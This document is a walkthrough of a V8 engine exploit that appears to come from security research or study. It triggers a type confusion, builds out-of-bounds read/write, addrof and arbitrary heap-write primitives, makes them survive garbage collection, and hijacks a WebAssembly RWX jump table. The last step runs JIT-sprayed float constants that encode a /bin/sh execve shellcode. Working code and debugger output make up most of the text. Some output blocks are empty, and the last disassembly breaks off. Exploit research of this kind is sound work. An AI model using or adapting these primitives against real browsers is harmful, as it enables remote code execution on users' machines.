# Trigger

Successfully trigger the type confusion:

```shell
Debug of corrupted_instance.x
DebugPrint: 0x118e00404bcd: [JSArray] in OldSpace
 - map: 0x118e0018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
             ^^^^^^^^^^^^^^
              same with a
 - length: 8
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.x
DebugPrint: 0x118e00404c01: [JSArray] in OldSpace
 - map: 0x118e0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS] <--- different elements kind
             ^^^^^^^^^^^^^^
              same with x
 - length: 1
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

# Initial read-write primitives

Once the vulnerability is triggered, the same memory region is used for storing the backing buffer of an array with objects (x) as well as the backing buffer and metadata of a packed double array (a). This means that the length property of the packed double array a can be modified by writing to certain elements in the object array.

Look at the memory of JSArray again:

```shell
Debug of corrupted_instance.a
DebugPrint: 0x25a200404ccd: [JSArray] in OldSpace
 - map: 0x25a20018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x25a20018e935 <JSArray[0]>
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x25a2000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x25a200000d41: [String] in ReadOnlySpace: #length: 0x25a200025e2d <AccessorInfo name= 0x25a200000d41 <String[6]: #length>, data= 0x25a200000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Memmory dump at elements:

```shell
gef➤  x/64x 0x25a200404cbd - 1
0x25a200404cbc:	0x00000851	0x00000002	0x9999999a	0x3ff19999
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of FDA   length=1           1.1              <-- pointer tagging, length = 2 on memory
0x25a200404ccc:	0x0018efc1	0x000006cd	0x00404cbd	0x00000002
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of JSArray                       length of JSArray <-- at offset 5
```

FDA stand for FixedDoubleArray.

The following code attempts to write `0x10000` to the length field of the object array:

```js
corrupted_instance.x[5] = 0x10000;
```

Output:

```shell
[+] Triggering the bug...
[+] Corrupting the metadata (length) of corrupted_instance.a ..
[+] Initial corruption succeeded!
Debug of corrupted_instance.x
DebugPrint: 0x17f900404c3d: [JSArray] in OldSpace
 - map: 0x17f90018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
 - length: 8
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.a
DebugPrint: 0x17f900404c71: [JSArray] in OldSpace
 - map: 0x17f90018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536 <---- 0x10000
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Once the length of the array is overwritten, out of bounds read/write can be performed, relative to the position of the backing element buffer of the array. To make use of this, the exploit allocates another packed double array and **finds the offset and the element index to reach its metadata from the start of the elements buffer of the corrupted array**.

```js
print("Perfoming read/write out of bounds...");
while (true) {
   let rwarr = [1.1, 2.2, 3.3];
   let rwarr_addr = addrof_tmp(rwarr);
   let a_addr = addrof_tmp(corrupted_instance.a);

   // If our target array to corrupt does not lie after our corrupted array, then
   // we can't do anything. Bail and retry the exploit.
   if (rwarr_addr < a_addr) {
      // print("[+] Target array does not lie after corrupted array. Retrying...");
   } else {
      print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
      print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
      debug_print(`corrupted_instance.a`, corrupted_instance.a);
      debug_print(`rwarr`, rwarr);
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - a_addr) + 0xc; // 0xc is the offset from the metadata to the backing storage
      if ((offset % 8) != 0) {
            offset -= 4; // turn back 4 bytes if the offset is not divisible by 8 (each element is 8 bytes long),
            // because we need to convert it to number of elements
            // used for changing the backing storage of rwarr through corrupted_instance.a
      }
      print("[+] Offset: " + offset);

      let marker42_idx = offset / 8; // idex of backing storage of corrupted_instance.a
      // marker42_idx += 9; // no need
      break;
   }
}
```

Debug print out both buffers:

```shell
DebugPrint: 0x3ba1001a5d15: [JSArray] in OldSpace
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> {
           0: 1.1
 }

Debug of rwarr
DebugPrint: 0x3ba1002c267d: [JSArray]
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }

[+] Calculating the offset...
[+] Offset: 1165680
[+] Address of backing storage pointer of rwarr: 2c2684
```

First, we calculate the address of the backing storage pointer of `rwarr` from `rwarr_addr`:

```shell
gef➤  x/12x 0x3ba1002c267d - 1 + 8
0x3ba1002c2684:	0x002c265d	0x00000006	0x00001085	0x001a5d51
                  ^^^^^^^^^^
                  elements
0x3ba1002c2694:	0x000007b1	0x002c267d	0x3ff19999	0x000007b1
0x3ba1002c26a4:	0x001a5d15	0x3ff19999	0x000005dd	0x0000000e
```

Then, add `a_addr` with the offset to get the same address:

```shell
gef➤  p 0x3ba1001a5d15 -1 + 1165680
$12 = 0x3ba1002c2684
```

After that, the offset from the backing storage of `corrupted_instance.a` to get the same address need to be added by 16:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165680 + 16
$14 = 0x3ba1002c2684
```

The reason is that the backing storage of `corrupted_instance.a` is 16 bytes before the JSArray object.

```shell
gef➤  x/24x 0x3ba1001a5d05 - 1
0x3ba1001a5d04:	0x00000851	0x00000002	0x001a5d15	0x3ff19999
                  ^^^^^^^^^^                                      
                  Map of FixedDoubleArray                         
0x3ba1001a5d14:	0x0018efc1	0x000006cd	0x001a5d05	0x00020000
                  ^^^^^^^^^^
                  Map of JSArray
0x3ba1001a5d24:	0x001a357d	0x001a357d	0x00000a09	0x00000000
0x3ba1001a5d34:	0x000015d5	0x00028991	0x001a5d2d	0x0018efc1
0x3ba1001a5d44:	0x000006cd	0x002c2149	0x00000006	0x0000150d
0x3ba1001a5d54:	0x001a5d41	0x00000000	0x002c2615	0x00000001
```

We convert the above calculation into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165696
$15 = 0x3ba1002c2684
```

And into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 145712*8
$16 = 0x3ba1002c2684
```

Where `145712` is our index of the element that points to the backing storage of rwarr.

Now, we have the ability to point to any memory address as we want through `corrupted_instance.a[145712]`.

If the elements pointer of this array is modified to point to a specific value, then writing to an index in the rwarr will write a controlled float to this chosen address thereby achieving an arbitrary write in the V8 heap.

```js
function v8h_write64(where, what) {
    helper.f64[0] = corrupted_instance.a[marker42_idx];
    if (helper.u32[0] == 0x6) {
        helper.f64[0] = corrupted_instance.a[marker42_idx - 1];
        helper.u32[1] = where - 8;
        corrupted_instance.a[marker42_idx - 1] = helper.f64[0];
    } else if (helper.u32[1] == 0x6) {
        helper.u32[0] = where - 8;
        corrupted_instance.a[marker42_idx] = helper.f64[0];
    }
    rwarr[0] = what;
}
```

The first if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717
0x3cb6002c297c:	0x00000006	0x00001085	0x001a6021	0x000007b1
                  ^^^^^^^^^^  ^^^^^^^^^^
                    u32[0]      u32[1]
0x3cb6002c298c:	0x002c2971	0x3ff19999	0x000007b1	0x001a5fe5
0x3cb6002c299c:	0x3ff19999	0x00000155	0x00000003	0x0000001d
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 8
0x3cb6002c2974:	0x000006cd	0x002c2951	0x00000006	0x00001085
                              ^^^^^^^^^^  
                             u32[1]=where-8    
0x3cb6002c2984:	0x001a6021	0x000007b1	0x002c2971	0x3ff19999
0x3cb6002c2994:	0x000007b1	0x001a5fe5	0x3ff19999	0x00000155
```

The else if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 4
0x3cb6002c2978:	0x002c2951	0x00000006	0x00001085	0x001a6021
                  ^^^^^^^^^^  ^^^^^^^^^^
                u32[0]=where-8   u32[1]
0x3cb6002c2988:	0x000007b1	0x002c2971	0x3ff19999	0x000007b1
0x3cb6002c2998:	0x001a5fe5	0x3ff19999	0x00000155	0x00000003
```

Try to write something:

```js
print("[+] Writing data...");
let data = 13.37;                                    // have to be float because rwarr is a float array
let bufToBeWritten = [1.1, 2.2, 3.3, 4.4];
let bufToBeWritten_addr = addrof_tmp(bufToBeWritten);
v8h_write64(bufToBeWritten_addr - 1 + 0x10, data);   // 0x10 is offset of length of JSArray
debug_print('bufToBeWritten', bufToBeWritten);
```

Calculating offset and index:

```shell
[+] Perfoming read and write out of bounds...
[+] Calculating the offset...
[+] Offset: 1298520
[+] Calculating the index...
[+] Index: 162316
[+] The approximately view of pointer's data: 0x13ffd1 0x6
```

Debug print of `bufToBeWritten`:

```shell
[+] Writing data...
Debug of bufToBeWritten
DebugPrint: 0x227005422c5: [JSArray]
 - map: 0x02270018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x02270018e935 <JSArray[0]>
 - elements: 0x0227005422dd <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 511705092 <---- it changed from 4
 - properties: 0x0227000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x22700000d41: [String] in ReadOnlySpace: #length: 0x022700025e2d <AccessorInfo name= 0x022700000d41 <String[6]: #length>, data= 0x022700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x0227005422dd <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.2
           2: 3.3
           3: 4.4
}
```

However both, the `addrof` as well as the write primitive depend on there being no garbage collection run after the successful trigger of the bug. This is because if a GC occurs, then it will move the objects in memory and primitives like corruption of the array elements will no longer work because the metadata and elements region of the array maybe moved to separate regions by the Garbage Collector. A GC can also crash the engine if it sees corrupted metadata like corrupted maps or array lengths or elements pointers.

# GC Resistant Primitives

After triggering GC for moving objects into old space:

```shell
Debug of holder
DebugPrint: 0x385d0019c909: [JS_OBJECT_TYPE] in OldSpace
Debug of changer
DebugPrint: 0x385d0019c931: [JSArray] in OldSpace
Debug of leaker
DebugPrint: 0x385d0019c921: [JSArray] in OldSpace
```

All of the objects are moved to old space.

Once the vulnerability is triggered, the exploit uses the initial `addrof` to find the address of the `changer`/`leaker`/`holder` objects. It then overwrites the elements pointer of the changer object to point to the address of the leaker `object` and also overwrites the elements pointer of leaker `object` to point to the address of the holder `object`. This corruption is done using the heap write primitive achieved in the previous section. The following code shows this.

Layout:

```js
+-------------------------------+
| Changer (Array)               |
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Leaker (Array)                |<-----------------------------+
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Holder (Object)               |<-----------------------------+
|-------------------------------|
| p1: 0x1234                    |
| p2: 0x1234                    |
| p3: 0x1234                    |
+-------------------------------+
```

Here is how we do it:

```js
changer_addr = addrof_tmp(changer);
leaker_addr = addrof_tmp(leaker);
holder_addr = addrof_tmp(holder);

helper.u32[1] = 0xc; helper.u32[0] = holder_addr;
original_holder_bytes = helper.f64[0];

helper.u32[1] = 0xc; helper.u32[0] = leaker_addr;
v8h_write64(changer_addr + 0x8, helper.f64[0]);                //0x8 is offset of `elements` pointer
v8h_write64(leaker_addr + 0x8, original_holder_bytes);
```

Output:

```shell
Debug of changer
DebugPrint: 0xa980019ca7d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca6d <JSArray[6]> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of leaker
DebugPrint: 0xa980019ca6d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca55 <Object map = 0xa980019c2fd> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of holder
DebugPrint: 0xa980019ca55: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x0a980019c2fd <Map[24](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0a9800184b21 <Object map = 0xa980018415d>
 - elements: 0x0a98000006cd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x0a98000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0xa980019bdd9: [String] in OldSpace: #p1: 4660 (const data field 0), location: in-object
    0xa980019bde9: [String] in OldSpace: #p2: 4660 (const data field 1), location: in-object
    0xa980019bdf9: [String] in OldSpace: #p3: 4660 (const data field 2), location: in-object
 }
```

Also, remember to fix the corrupted arrays

```js
corrupted_instance.x.length = 0;
corrupted_instance.a.length = 0;
rwarr.length = 0;
```

Use new primitives to read/write:

```js
print("[+] Using new primitives to read data");
v8h_read64(bufToBeWritten_addr + 0x8);
print("[+] The original data: 0x" + helper.u32[0].toString(16) + " 0x" + helper.u32[1].toString(16));
debug_print('bufToBeWritten', bufToBeWritten);

print("[+] Using new primitives to write data");
v8h_write(bufToBeWritten_addr - 1 + 0x10, data);
debug_print('bufToBeWritten', bufToBeWritten);
```

Output:

```shell
[+] Using new primitives to read data
[+] The original data: 0x54223d
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
[+] Using new primitives to write data
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 109051908
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

Also, we can leak address with a new `addrOf` primitive:

```js
function addrOf(obj) {
    holder.p2 = obj;
    let ret = leaker[1];
    holder.p2 = 0;
    return helper.f64toi64(ret) & 0xffffffffn;
}
```

Output:

```shell
[+] The address of bufToBeWritten: 0x542205
Debug of bufToBeWritten
DebugPrint: 0x19a700542205: [JSArray]
 - map: 0x19a70018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x19a70018e935 <JSArray[0]>
 - elements: 0x19a70054221d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x19a7000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x19a700000d41: [String] in ReadOnlySpace: #length: 0x19a700025e2d <AccessorInfo name= 0x19a700000d41 <String[6]: #length>, data= 0x19a700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

# Shellcode

We need to find `jump_table_start` offset.

The memory on the heap:

```shell
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00001d75e0000000 0x00001d75f0000000 0x0000000000000000 --- 
0x00002ee300000000 0x00002eeb00000000 0x0000000000000000 --- 
0x00002eeb00000000 0x00002eeb00010000 0x0000000000000000 r-- 
0x00002eeb00010000 0x00002eeb00020000 0x0000000000000000 --- 
0x00002eeb00020000 0x00002eeb00040000 0x0000000000000000 r-- 
0x00002eeb00040000 0x00002eeb00145000 0x0000000000000000 rw- 
0x00002eeb00145000 0x00002eeb00180000 0x0000000000000000 --- 
0x00002eeb00180000 0x00002eeb001c0000 0x0000000000000000 rw- 
0x00002eeb001c0000 0x00002eeb001cd000 0x0000000000000000 r-- 
0x00002eeb001cd000 0x00002eeb00200000 0x0000000000000000 --- 
0x00002eeb00200000 0x00002eeb002c3000 0x0000000000000000 rw- 
0x00002eeb002c3000 0x00002eeb00300000 0x0000000000000000 --- 
0x00002eeb00300000 0x00002eeb00680000 0x0000000000000000 rw- 
0x00002eeb00680000 0x00002eec00000000 0x0000000000000000 --- 
0x00002eec00000000 0x00002eec00100000 0x0000000000000000 rw- 
0x00002eec00100000 0x00002eee00000000 0x0000000000000000 --- 
0x00002eee00000000 0x00002eee02000000 0x0000000000000000 --- 
0x00002eee02000000 0x00002ff300000000 0x0000000000000000 --- 
0x0000360ffa27c000 0x0000360ffa27d000 0x0000000000000000 rwx  <---- RWX memory
0x0000360ffa27d000 0x0000360ffa27e000 0x0000000000000000 --- 
0x0000560f8ce2f000 0x0000560f8d281000 0x0000000000000000 r-- /home/aleister/Workspaces/v8-exploitation/v8/out/release-c21e8fe0c5b/d8
...
```

Layout of `WasmInstanceObject`:

```shell
DebugPrint: 0x2eeb00431da5: [WasmInstanceObject] in OldSpace
 - map: 0x2eeb00191215 <Map[208](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x2eeb001912c1 <Object map = 0x2eeb00431ff5>
 - elements: 0x2eeb000006a5 <FixedArray[0]> [HOLEY_ELEMENTS]
 - module_object: 0x2eeb00542465 <Module map = 0x2eeb001910ed>
 - exports_object: 0x2eeb00542545 <Object map = 0x2eeb00431f99>
 - native_context: 0x2eeb00183c51 <NativeContext[284]>
 - memory_objects: 0x2eeb000006a5 <FixedArray[0]>
 - tables: 0x2eeb000006a5 <FixedArray[0]>
 - indirect_function_tables: 0x2eeb000006a5 <FixedArray[0]>
 - imported_function_refs: 0x2eeb000006a5 <FixedArray[0]>
 - indirect_function_table_refs: 0x2eeb000006a5 <FixedArray[0]>
 - wasm_internal_functions: 0x2eeb00542515 <FixedArray[1]>
 - managed_object_maps: 0x2eeb00542539 <FixedArray[1]>
 - feedback_vectors: 0x2eeb000006a5 <FixedArray[0]>
 - well_known_imports: 0x2eeb000006a5 <FixedArray[0]>
 - memory0_start: 0x2feaffffffff
 - memory0_size: 0
 - new_allocation_limit_address: 0x560fa05a1db0
 - new_allocation_top_address: 0x560fa05a1da8
 - old_allocation_limit_address: 0x560fa05a1dc8
 - old_allocation_top_address: 0x560fa05a1dc0
 - imported_function_targets: 0x2eeb00000e19 <ByteArray[0]>
 - globals_start: 0x2feaffffffff
 - imported_mutable_globals: 0x2eeb00000e19 <ByteArray[0]>
 - indirect_function_table_size: 0
 - indirect_function_table_sig_ids: 0x2eeb00000e19 <ByteArray[0]>
 - indirect_function_table_targets: 0x2eeb0000604d <ExternalPointerArray[0]>
 - isorecursive_canonical_types: 0x560fa061e260
 - jump_table_start: 0x360ffa27c000
 - data_segment_starts: 0x2eeb00000e19 <ByteArray[0]>
 - data_segment_sizes: 0x2eeb00000e19 <ByteArray[0]>
 - element_segments: 0x2eeb000006a5 <FixedArray[0]>
 - hook_on_function_call_address: 0x560fa05b6a19
 - tiering_budget_array: 0x560fa05f2ed0
 - memory_bases_and_sizes: 0x2eeb00000e19 <ByteArray[0]>
 - break_on_entry: 0
 - properties: 0x2eeb000006a5 <FixedArray[0]>
 - All own properties (excluding elements): {}
```

Find RWX in WasInstanceObject:

```shell

```

Calculate the offset:

```shell

```
The WebAssembly code:

```js
(module
  (func (export "f") (param i64) (param i64)
  	f64.const -1163636095853604
    drop
  )
  (memory $M0 1)
)
```

Will have this compiled version:

```shell

```

Also, we find the offset from jump_table_start to the exported function is `0xb58`.

The constants declared in the WebAssembly code **can potentially be interpreted as assembly code** by jumping in the middle of an instruction, which is valid on machines that run Intel architecture. Hence with the RIP control described in the previous section, it is possible to **redirect the RIP into the middle of some compiled wasm code which has controlled float constants and interpret them as x86-64 instructions**.

Overwrite the jump table pointer and call function `f` with first two arguments are 12 (0xc):

```shell
gef➤  c
Continuing.

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x000023af87e11b5e in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xc               
$rbx   : 0x000057eb5f4f9dc0  →  0x0000296200198ed5  →  0x1b25050505000004
$rcx   : 0x0               
$rdx   : 0xc               
$rsp   : 0x00007ffc21c010f8  →  0x000057eb35391c0a  →  <Builtins_JSToWasmWrapperAsm+008a> mov r12, QWORD PTR [r13+0x150]
$rbp   : 0x00007ffc21c01128  →  0x00007ffc21c012f0  →  0x00007ffc21c01368  →  0x00007ffc21c01398  →  0x00007ffc21c01400  →  0x00007ffc21c01530  →  0x00007ffc21c015b0  →  0x00007ffc21c01690
$rsi   : 0x000029620043f9e1  →  0xa5000006a5001912
$rdi   : 0x000057eb5f5209a8  →  0x0000000000000000
$rip   : 0x000023af87e11b5e  →  0x6ef9c1c4c3108948
$r8    : 0x66826e          
$r9    : 0x000057eb5f4fbce0  →  0x0000000000000000
$r10   : 0x0               
$r11   : 0x00007853a3a85080  →  0x00007853a3a85080
$r12   : 0x00007853a37475d8  →  0x0000000000000001
$r13   : 0x000057eb5f4b2d20  →  0x000057eb352f8800  →  <Builtins_AdaptorWithBuiltinExitFrame+0000> mov ecx, DWORD PTR [rdi+0xf]
$r14   : 0x0000296200000000  →  0x0000000000040000
$r15   : 0x000023af87e11b5a  →  0xc310894890909090
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc21c010f8│+0x0000: 0x000057eb35391c0a  →  <Builtins_JSToWasmWrapperAsm+008a> mov r12, QWORD PTR [r13+0x150]	 ← $rsp
0x00007ffc21c01100│+0x0008: 0xffffffffffffffff
0x00007ffc21c01108│+0x0010: 0x00000000000000be
0x00007ffc21c01110│+0x0018: 0x00007ffc21c01188  →  0x00007ffc21c01219  →  0x0000000000000000
0x00007ffc21c01118│+0x0020: 0x00007ffc21c012a0  →  0x0000000000000000
0x00007ffc21c01120│+0x0028: 0x000000000000000e
0x00007ffc21c01128│+0x0030: 0x00007ffc21c012f0  →  0x00007ffc21c01368  →  0x00007ffc21c01398  →  0x00007ffc21c01400  →  0x00007ffc21c01530  →  0x00007ffc21c015b0  →  0x00007ffc21c01690	 ← $rbp
0x00007ffc21c01130│+0x0038: 0x000057eb354629da  →  <Builtins_JSToWasmWrapper+0ada> mov rcx, QWORD PTR [rbp-0x100]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x23af87e11b5b                  nop    
   0x23af87e11b5c                  nop    
   0x23af87e11b5d                  nop    
 → 0x23af87e11b5e                  mov    QWORD PTR [rax], rdx
   0x23af87e11b61                  ret    
   0x23af87e11b62                  vmovq  xmm0, r10
   0x23af87e11b67                  mov    r10, QWORD PTR [rsi+0x77]
   0x23af87e11b6b                  sub    DWORD PTR [r10], 0x27
   0x23af87e11b6f                  js     0x23af87e11b89
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

The original code of wasm instance:

```shell
gef➤  x/48i 0x6915065ab40
   0x6915065ab40:	push   rbp
   0x6915065ab41:	mov    rbp,rsp
   0x6915065ab44:	push   0x8
   0x6915065ab46:	push   rsi
   0x6915065ab47:	sub    rsp,0x10
   0x6915065ab4e:	cmp    rsp,QWORD PTR [r13-0x60]
   0x6915065ab52:	jbe    0x6915065ac1e
   0x6915065ab58:	vxorpd xmm0,xmm0,xmm0
   0x6915065ab5c:	mov    rax,QWORD PTR [rsi+0x27]
   0x6915065ab60:	shr    rax,0x18
   0x6915065ab64:	add    rax,r14
   0x6915065ab67:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab6b:	movabs r10,0xbeb909090583b6a
   0x6915065ab75:	vmovq  xmm0,r10
   0x6915065ab7a:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab7e:	movabs r10,0xbeb5b0068732f68
   0x6915065ab88:	vmovq  xmm0,r10
   0x6915065ab8d:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab91:	movabs r10,0xbeb596e69622f68
   0x6915065ab9b:	vmovq  xmm0,r10
   0x6915065aba0:	vmovsd QWORD PTR [rax],xmm0
   0x6915065aba4:	movabs r10,0xbeb909020e3c148
   0x6915065abae:	vmovq  xmm0,r10
   0x6915065abb3:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abb7:	movabs r10,0xbeb909053cb0148
   0x6915065abc1:	vmovq  xmm0,r10
   0x6915065abc6:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abca:	movabs r10,0xbeb909090e78948
   0x6915065abd4:	vmovq  xmm0,r10
   0x6915065abd9:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abdd:	movabs r10,0xbebd23148f63148
   0x6915065abe7:	vmovq  xmm0,r10
   0x6915065abec:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abf0:	movabs r10,0xbeb90909090050f
   0x6915065abfa:	vmovq  xmm0,r10
   0x6915065abff:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ac03:	mov    r10,QWORD PTR [rsi+0x77]
   0x6915065ac07:	sub    DWORD PTR [r10],0xc3
   0x6915065ac0e:	js     0x6915065ac2c
   0x6915065ac14:	mov    eax,0x2a
   0x6915065ac19:	mov    rsp,rbp
   0x6915065ac1c:	pop    rbp
   0x6915065ac1d:	ret
```

Jump to the middle to have the following instructions:

```shell
gef➤  x/32i 0x6915065ab40 + 0x2d - 2
   0x6915065ab6b:	movabs r10,0xbeb909090583b6a
   0x6915065ab75:	vmovq  xmm0,r10
   0x6915065ab7a:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab7e:	movabs r10,0xbeb5b0068732f68
   0x6915065ab88:	vmovq  xmm0,r10
